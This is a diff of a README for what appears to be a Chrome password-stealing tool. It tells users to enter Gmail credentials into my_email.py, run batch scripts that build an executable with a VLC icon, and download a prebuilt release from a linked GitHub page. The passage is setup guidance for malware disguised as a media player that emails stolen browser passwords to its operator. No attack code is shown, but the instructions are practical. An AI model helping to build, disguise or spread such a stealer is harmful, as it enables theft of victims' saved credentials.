@@ -22,14 +22,13 @@ https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe
  
  build_local.bat will download and install depandances after he will build your .exe with icon vlc
  
- if it working
  
  
 open my_email.py
 
 put your gmail email (and password ), email sender
 
-run  build_email.bat
+run  build_email.bat : will download and install depandances after he will build your .exe with icon vlc
  
 ## Manuel installation
  
@@ -76,7 +75,11 @@ https://www.facebook.com/102313318301415/videos/3262395040481000/
 
 https://www.youtube.com/watch?v=KE-DUxuRVeo
 
-Happy Hacking
+Happy Hacking 
+
+## Teste Script without install python
+
+https://github.com/hakanonymos/steal-chrome-password-all-version/releases/tag/V1
 
 ## Contact 
 
